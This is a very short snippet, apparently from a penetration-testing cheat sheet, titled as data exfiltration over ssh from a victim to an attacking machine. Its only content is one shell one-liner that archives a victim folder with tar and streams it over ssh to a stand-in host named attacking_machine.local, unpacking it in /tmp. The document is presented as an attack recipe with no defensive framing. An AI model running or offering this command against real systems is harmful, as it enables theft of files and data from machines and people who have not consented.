
Data exfilteration using ssh (from victim to the attacking machine)
```shell
tar cf - victim_folder/ | ssh user@attacking_machine.local "cd /tmp/; tar xpf -"
```






